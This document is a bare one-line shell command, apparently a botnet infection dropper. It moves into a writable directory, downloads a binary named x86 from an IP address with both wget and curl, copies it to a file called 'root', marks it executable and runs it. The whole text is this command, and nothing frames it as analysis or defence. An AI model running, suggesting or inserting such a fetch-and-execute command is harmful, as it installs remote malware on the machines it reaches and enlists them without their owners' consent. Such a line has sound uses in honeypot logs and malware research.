cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.244.25.153/bins/x86; curl -O http://185.244.25.153/bins/x86;cat x86 >root;chmod +x *;./root root
